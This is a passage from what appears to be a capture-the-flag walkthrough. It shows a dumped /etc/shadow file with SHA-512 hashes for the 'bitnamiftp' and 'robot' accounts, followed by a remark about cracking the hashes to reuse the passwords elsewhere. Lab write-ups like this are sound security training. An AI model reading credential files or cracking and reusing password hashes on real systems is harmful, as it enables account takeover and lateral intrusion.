proxy:*:16610:0:99999:7:::
www-data:*:16610:0:99999:7:::
backup:*:16610:0:99999:7:::
list:*:16610:0:99999:7:::
irc:*:16610:0:99999:7:::
gnats:*:16610:0:99999:7:::
nobody:*:16610:0:99999:7:::
libuuid:!:16610:0:99999:7:::
syslog:*:16610:0:99999:7:::
sshd:*:16610:0:99999:7:::
ftp:*:16610:0:99999:7:::
bitnamiftp:$6$saPiFTAH$7K09sg5oIfkIs5kuMx1R/Um4HNd8O6vF2n8oICEom8VVer0BYATY5wtzdPdP3JeuKbZ4RYBml0THNQv8TSc0s/:16751:0:99999:7:::
mysql:!:16694:0:99999:7:::
varnish:!:16694::::::
robot:$6$HmQCDKcM$mcINMrQFa0Qm7XaUaS5xLEBSeP3bUkr18iwgwTAL8AIfUDYBWG5L8J9.Ukb3gVWUQoYam4G0m.I5qaHBnTddK/:16752:0:99999:7:::

```

If the machine was connected to any other network, we should have considered to crack the hashes. If they are cracked we might could use the password somewhere else.
